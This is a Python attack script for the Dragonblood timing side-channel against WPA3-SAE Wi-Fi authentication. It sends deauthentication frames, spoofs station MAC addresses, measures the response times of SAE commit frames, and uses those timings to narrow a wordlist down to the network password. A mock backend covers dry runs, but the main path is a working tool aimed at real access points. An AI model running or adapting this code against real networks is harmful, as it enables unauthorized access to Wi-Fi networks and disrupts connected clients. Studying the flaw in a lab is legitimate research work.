from __future__ import annotations

import argparse
import logging
import time
from pathlib import Path

from attacks.common.analysis.calibration import TimingCalibrator
from attacks.common.analysis.plotting import (
    plot_timing_boxplot,
    plot_timing_cdf,
    plot_timing_histogram,
)
from attacks.common.analysis.stats import GroupStatistics, compute_group_statistics
from attacks.common.base_attack import BaseAttack
from attacks.common.cli import add_common_arguments, create_backend, run_attack
from attacks.common.config import AttackConfig, PasswordRecoveryConfig
from attacks.common.io.reporting import (
    create_run_directory,
    save_analysis_report,
    save_metadata,
    save_timing_samples_csv,
)
from attacks.common.models import AnalysisReport, TimingRawResults, TimingSample
from attacks.common.wireless.sae import build_sae_commit_frame, is_sae_commit_response
from attacks.common.wireless.sae_crypto import sae_hash_to_element_iteration_count

logger = logging.getLogger(__name__)


def load_dictionary(config: PasswordRecoveryConfig) -> list[str]:
    if config.dictionary_words:
        return list(config.dictionary_words)

    if not config.dictionary_path:
        raise ValueError("Either dictionary_path or dictionary_words must be provided")

    dictionary_file = Path(config.dictionary_path)
    with open(dictionary_file, "r", errors="ignore") as file_handle:
        return [line.strip() for line in file_handle if line.strip()]


class PasswordRecoveryAttack(BaseAttack):
    def execute(self, config: AttackConfig) -> TimingRawResults:
        if not isinstance(config, PasswordRecoveryConfig):
            raise TypeError("PasswordRecoveryAttack requires PasswordRecoveryConfig")

        all_samples: list[TimingSample] = []

        for mac_index in range(config.max_mac_addresses):
            station_mac = f"{config.station_mac_prefix}:{mac_index:02x}"

            logger.info(
                "Collecting %d samples with MAC %s (%d/%d)",
                config.samples_per_group,
                station_mac,
                mac_index + 1,
                config.max_mac_addresses,
            )

            for attempt in range(config.samples_per_group):
                self.backend.send_deauth(
                    interface=self.interface,
                    target_bssid=self.target_bssid,
                    station_mac=station_mac,
                )

                frame = build_sae_commit_frame(
                    target_bssid=self.target_bssid,
                    source_mac=station_mac,
                )

                def response_filter(packet, bssid=self.target_bssid):
                    return is_sae_commit_response(packet, bssid)

                elapsed_ns = self.backend.measure_response_time(
                    interface=self.interface,
                    frame_to_send=frame,
                    response_filter=response_filter,
                    timeout=config.timeout_seconds,
                )

                if elapsed_ns is not None:
                    sample = TimingSample(
                        password_group=station_mac,
                        attempt=attempt,
                        response_time_ns=elapsed_ns,
                        timestamp=time.time(),
                    )
                    all_samples.append(sample)

                if config.inter_sample_delay_ms > 0:
                    time.sleep(config.inter_sample_delay_ms / 1000)

        logger.info(
            "Collected %d total samples across %d MACs",
            len(all_samples),
            config.max_mac_addresses,
        )

        return TimingRawResults(
            attack_name="dragonblood-recovery",
            samples=all_samples,
            metadata={
                "max_mac_addresses": config.max_mac_addresses,
                "station_mac_prefix": config.station_mac_prefix,
            },
        )

    def analyze(self, raw_results: TimingRawResults) -> AnalysisReport:
        if not isinstance(raw_results, TimingRawResults):
            raise TypeError("Expected TimingRawResults")

        config = self._recovery_config
        run_directory = create_run_directory(self.output_dir, "dragonblood-recovery")

        grouped_timings: dict[str, list[int]] = {}
        for sample in raw_results.samples:
            station_mac = sample.password_group
            if station_mac not in grouped_timings:
                grouped_timings[station_mac] = []
            grouped_timings[station_mac].append(sample.response_time_ns)

        statistics_per_mac: dict[str, GroupStatistics] = {}
        for station_mac, timing_values in grouped_timings.items():
            statistics_per_mac[station_mac] = compute_group_statistics(station_mac, timing_values)

        calibrator = TimingCalibrator()
        calibration = calibrator.calibrate(statistics_per_mac)
        logger.info(
            "Calibrated: baseline=%.0fns, Δt=%.0fns, %d clusters",
            calibration.baseline_ns,
            calibration.nanoseconds_per_iteration,
            calibration.detected_cluster_count,
        )

        dictionary = load_dictionary(config)
        logger.info("Loaded %d dictionary words", len(dictionary))

        candidates = set(dictionary)
        iterations_per_mac: dict[str, int] = {}
        candidates_per_round: list[int] = []

        for station_mac, statistics in statistics_per_mac.items():
            estimated_iterations = calibrator.estimate_iteration_count(
                statistics.mean_ns, calibration,
            )
            iterations_per_mac[station_mac] = estimated_iterations

            logger.info(
                "MAC %s: mean=%.0fns → estimated %d iterations, filtering %d candidates",
                station_mac,
                statistics.mean_ns,
                estimated_iterations,
                len(candidates),
            )

            candidates = {
                word for word in candidates
                if sae_hash_to_element_iteration_count(
                    word, self.target_bssid, station_mac
                ) == estimated_iterations
            }
            candidates_per_round.append(len(candidates))

            logger.info("  → %d candidates remain", len(candidates))

            if len(candidates) <= 1:
                break

        recovered_password = None
        if len(candidates) == 1:
            recovered_password = candidates.pop()
            logger.info("Password recovered: %s", recovered_password)
            summary = f"Password recovered: {recovered_password}"
        else:
            summary = f"Password not uniquely identified: {len(candidates)} candidates remain"
            logger.warning(summary)

        plots_directory = run_directory / "plots"
        plot_paths = []
        if grouped_timings:
            plot_paths.append(plot_timing_histogram(grouped_timings, plots_directory / "histogram.png"))
            plot_paths.append(plot_timing_boxplot(grouped_timings, plots_directory / "boxplot.png"))
            plot_paths.append(plot_timing_cdf(grouped_timings, plots_directory / "cdf.png"))

        csv_path = run_directory / "raw_samples.csv"
        save_timing_samples_csv(raw_results.samples, csv_path)
        save_metadata(
            run_directory / "metadata.json",
            attack_name="dragonblood-recovery",
            config_dict=raw_results.metadata,
        )

        report = AnalysisReport(
            attack_name="dragonblood-recovery",
            success=recovered_password is not None,
            summary=summary,
            raw_csv_path=csv_path,
            plots=plot_paths,
            metadata={
                "recovered_password": recovered_password,
                "estimated_iterations_per_mac": iterations_per_mac,
                "candidates_per_round": candidates_per_round,
                "final_candidate_count": len(candidates) if recovered_password is None else 1,
                "dictionary_size": len(dictionary),
                "macs_used": len(iterations_per_mac),
            },
        )

        save_analysis_report(report, run_directory / "analysis.json")

        return report

    def run(self, config: AttackConfig) -> AnalysisReport:
        self._recovery_config = config
        return super().run(config)


def main():
    parser = argparse.ArgumentParser(
        description="Dragonblood SAE timing side-channel → password recovery"
    )
    add_common_arguments(parser)
    parser.add_argument("--samples", type=int, default=500, help="Samples per MAC address")
    parser.add_argument("--dictionary", type=str, required=True, help="Path to wordlist file")
    parser.add_argument("--max-macs", type=int, default=15, help="Maximum spoofed MAC addresses")
    arguments = parser.parse_args()

    if arguments.dry_run:
        from attacks.common.models import APInfo
        from attacks.common.wireless.backend import VulnerableMockBackend
        backend = VulnerableMockBackend(
            target_password="dr4gonfly",
            nanoseconds_per_iteration=arguments.ns_per_iteration,
        )
        backend.ap_config = APInfo(
            bssid=arguments.bssid,
            ssid=arguments.ssid,
            channel=arguments.channel,
            capabilities=["RSN"],
        )
    else:
        backend = create_backend(arguments)
    attack = PasswordRecoveryAttack(
        interface=arguments.interface,
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        output_dir=arguments.output_dir,
        backend=backend,
    )

    config = PasswordRecoveryConfig(
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        channel=arguments.channel,
        samples_per_group=arguments.samples,
        inter_sample_delay_ms=0,
        dictionary_path=arguments.dictionary,
        max_mac_addresses=arguments.max_macs,
    )

    run_attack("dragonblood-recovery", attack, config)


if __name__ == "__main__":
    main()
